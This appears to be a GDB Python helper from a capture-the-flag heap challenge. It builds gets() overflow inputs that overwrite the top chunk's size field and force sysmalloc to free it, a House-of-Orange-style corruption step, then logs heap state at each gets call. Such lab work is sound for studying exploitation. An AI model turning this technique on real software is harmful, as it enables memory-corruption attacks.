import gdb, struct
p64 = lambda x: struct.pack("<Q", x)
def dump(addr, n):
    return gdb.execute("x/%dgx %#x" % (n, addr), to_string=True)

# (size, payload_to_gets)  -- gets buffer is pkt+8
OPS = [
    (0x10, b"\x00"*8),                                  # op0 chunk @heap+0x290 (user 0x2a0)
    (0x10, p64(0) + p64(0) + p64(0xd31)),               # op1 chunk @0x2b0 (user 0x2c0); write top size
    (0x1000, b"\x00"*8),                               # op2 oversize -> sysmalloc frees old top
    (0x8, b"\x00"*8),                                  # op3 take from unsorted
    (0x8, b"\x00"*8),
    (0x8, b"\x00"*8),
    (0x8, b"\x00"*8),
]

def build(ops):
    out = b""
    for size, payload in ops:
        out += struct.pack("<Q", size) + payload + b"\n"
    return out

open("/mnt/d/ctf-index/_z_441/input.bin", "wb").write(build(OPS))

class GetsBP(gdb.Breakpoint):
    def stop(self):
        hits[0] += 1
        rdi = int(gdb.parse_and_eval("$rdi"))
        pkt = rdi - 8
        sz = int(gdb.parse_and_eval("*(unsigned long*)%#x" % pkt))
        # chunk size field
        csz = int(gdb.parse_and_eval("*(unsigned long*)%#x" % (pkt-8))) & ~0xff
        top = int(gdb.parse_and_eval("(unsigned long)main_arena.top")) if False else 0
        gdb.write("GETS#%d pkt=%#x pkt->sz=%#x next_chunk_size_inuse=%#x\n" % (hits[0], pkt, sz, csz))
        return hits[0] >= len(OPS)

hits = [0]
GetsBP("gets")
try:
    gdb.execute("run < /mnt/d/ctf-index/_z_441/input.bin")
except gdb.error as e:
    gdb.write("run ended: %s\n" % e)
gdb.write("\n==== MAPS ====\n")
gdb.write(gdb.execute("info proc mappings", to_string=True))
gdb.write("\n==== HEAP DUMP (0x2400 from heap base) ====\n")
# find heap base from rdi
rdi = int(gdb.parse_and_eval("$rdi"))
gdb.write("last rdi=%#x\n" % rdi)
# dump from page-aligned-ish base found via /proc maps parsing done above
